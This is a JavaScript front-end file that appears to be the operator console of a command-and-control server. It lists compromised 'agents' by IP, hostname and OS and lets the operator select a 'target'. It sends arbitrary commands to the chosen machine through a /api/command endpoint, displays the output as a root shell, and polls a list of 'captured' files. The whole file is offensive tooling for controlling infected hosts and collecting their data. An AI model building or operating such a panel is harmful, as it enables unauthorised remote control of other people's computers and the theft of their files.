$(document).ready(function () {
    const socket = io();
    let selectedAgentIp = null;
    let agents = {};

    function updateTime() {
        const now = new Date();
        $('#clock').text(now.toLocaleTimeString('en-US', { hour12: false }));
    }
    setInterval(updateTime, 1000);
    updateTime();

    // Socket events
    socket.on('connect', function () {
        $('#connection-status').text('CONNECTED').removeClass('offline').addClass('online');
        logSystem('Connected to C2 Server');
    });

    socket.on('disconnect', function () {
        $('#connection-status').text('DISCONNECTED').removeClass('online').addClass('offline');
        logSystem('Connection lost');
    });

    socket.on('agent_update', function (data) {
        updateAgentsList(data);
    });

    socket.on('command_output', function (data) {
        // Display command output in terminal
        const lines = data.output.split('\n');
        lines.forEach(line => {
            if (line.trim()) {
                $('#terminal-output').append(`<div class="line output">${escapeHtml(line)}</div>`);
            }
        });
        scrollToBottom();
    });

    // UI Logic
    function updateAgentsList(data) {
        const list = $('#agents-list');
        // Simple diff check could be better, but full redraw is fine for prototype
        if (data.length === 0) {
            list.html('<div class="empty-state">NO AGENTS DETECTED...</div>');
            return;
        }

        list.empty();
        data.forEach(agent => {
            agents[agent.ip] = agent;
            const isSelected = selectedAgentIp === agent.ip ? 'selected' : '';
            const statusClass = agent.status === 'active' || agent.status === 'online' ? 'active' : '';

            const html = `
                <div class="agent-item ${isSelected}" onclick="selectAgent('${agent.ip}')">
                    <div class="agent-header">
                        <span><span class="status-dot ${statusClass}"></span>${agent.ip}</span>
                        <span>[${agent.id}]</span>
                    </div>
                    <div class="agent-details">
                        ${agent.hostname} | ${agent.os}<br>
                        Last seen: ${agent.last_seen}
                    </div>
                </div>
            `;
            list.append(html);
        });

        $('.agents-panel .count').text(`[${data.length}]`);
    }

    window.selectAgent = function (ip) {
        selectedAgentIp = ip;
        $('#selected-agent').text(ip);
        $('#cmd-input').prop('disabled', false).focus();
        $('.agent-item').removeClass('selected');
        // Re-apply selected class logic (handled in redraw mostly, but for immediate feedback:
        // Actually better to handle via state which redraw will catch next tick or we force redraw
        // But for now let's just highlight clicked one manually
        $(`.agent-item:contains('${ip}')`).addClass('selected'); // Rough selector, good enough
        logSystem(`Target selected: ${ip}`);
    };

    // Command handling
    $('#cmd-input').on('keypress', function (e) {
        if (e.which === 13 && selectedAgentIp) {
            const cmd = $(this).val();
            if (!cmd) return;

            $(this).val('');
            logCommand(cmd);

            // Send to server
            fetch('/api/command', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    ip: selectedAgentIp,
                    command: cmd
                })
            })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'queued') {
                        // Ack
                    } else {
                        logError('Failed to queue command');
                    }
                })
                .catch(err => logError('Network error: ' + err));
        }
    });

    // File polling (simple version)
    function updateFiles() {
        fetch('/api/files')
            .then(res => res.json())
            .then(files => {
                const list = $('#files-list');
                if (files.length === 0) {
                    list.html('<div class="empty-state">NO FILES CAPTURED...</div>');
                    return;
                }
                list.empty();
                files.forEach(f => {
                    const html = `
                        <div class="file-item">
                            <span class="file-name">${f.name}</span>
                            <span class="file-size">${formatBytes(f.size)}</span>
                        </div>
                    `;
                    list.append(html);
                });
            });
    }
    setInterval(updateFiles, 5000);

    // Logging helpers
    function logSystem(msg) {
        $('#terminal-output').append(`<div class="line system">[SYSTEM] ${msg}</div>`);
        scrollToBottom();
    }

    function logCommand(cmd) {
        $('#terminal-output').append(`<div class="line command">root@${selectedAgentIp}:~# ${cmd}</div>`);
        scrollToBottom();
    }

    function logError(msg) {
        $('#terminal-output').append(`<div class="line error">[ERROR] ${msg}</div>`);
        scrollToBottom();
    }

    function scrollToBottom() {
        const terminal = document.getElementById('terminal-output');
        terminal.scrollTop = terminal.scrollHeight;
    }


    function escapeHtml(text) {
        const map = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#039;'
        };
        return text.replace(/[&<>"']/g, m => map[m]);
    }

    function formatBytes(bytes, decimals = 2) {
        if (bytes === 0) return '0 Bytes';
        const k = 1024;
        const dm = decimals < 0 ? 0 : decimals;
        const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
    }
});
